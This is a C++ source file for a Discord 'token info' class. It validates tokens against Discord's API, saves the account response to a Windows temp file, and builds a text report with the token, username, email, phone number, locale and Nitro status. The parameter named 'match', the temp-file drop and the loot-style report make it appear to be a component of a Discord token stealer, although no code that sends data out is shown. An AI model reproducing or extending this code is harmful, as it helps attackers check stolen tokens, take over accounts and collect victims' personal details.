#include "discord.h"

cpr::Response Discord::Discord::GetRequest(const std::string& token) {
	cpr::Response r = cpr::Get(cpr::Url{ "https://discordapp.com/api/v9/users/@me" },
		cpr::Header{ {"Content-Type", "application/json"}, {"Authorization", token} });
	std::ofstream info;
	info.open("C:\\Windows\\Temp\\info.json");
	info << r.text;
	info.close();
	return r;
}

void Discord::Discord::init(const std::string& token)
{
	this->token = token;
	GetRequest(token);
	Json::Value info_file;
	std::ifstream cfgfile("C:\\Windows\\Temp\\info.json");
	cfgfile >> info_file;
	id = info_file["id"].asString();
	std::string val1 = info_file["username"].asString();
	std::string val2 = info_file["discriminator"].asString();
	std::string val3 = val1 + "#" + val2;
	username = val3;
	std::string avid = info_file["avatar"].asString();
	avatar = "https://cdn.discordapp.com/avatars/" + id + "/" + avid;
	email = info_file["email"].asString();
	phone = info_file["phone"].asString();
	locale = info_file["locale"].asString();
	nsfw_allowed = info_file["nsfw_allowed"].asBool();
	mfa_enabled = info_file["mfa_enabled"].asBool();
	verified = info_file["verified"].asBool();
	nitro = info_file["premium_type"].asInt();
	cfgfile.close();
}

std::string Discord::Discord::getTokenInfo()
{
	std::string token_info = "";
	std::string szVerification, nitroStr;
	std::string verif = std::to_string(verified);
	if (verif.find("1") != std::string::npos) szVerification = "True";
	else szVerification = "False";
	switch (nitro)
	{
	case 0: nitroStr = "None"; break;
	case 1: nitroStr = "Classic"; break;
	case 2: nitroStr = "Booster"; break;
	}
	std::stringstream stream_info;
	stream_info << "Token: " << this->token << "\r\n" \
		<< "Username: " << username << "\r\n" \
		<< "ID: " << id << "\r\n" \
		<< "Email: " << email << "\r\n" \
		<< "Phone: " << phone << "\r\n" \
		<< "Locale: " << locale << "\r\n" \
		<< "Nitro: " << nitroStr << "\r\n" \
		<< "Avatar: " << avatar << "\r\n";

	token_info = stream_info.str();

	return token_info;
}

bool Discord::checkToken(const std::string& match)
{
	cpr::Response res = cpr::Get(cpr::Url{ "https://discordapp.com/api/v9/channels/@me" },
		cpr::Header{ {"Content-Type", "application/json"}, {"Authorization", match} });
	if (res.status_code == 400)
		return true;

	return false;
}
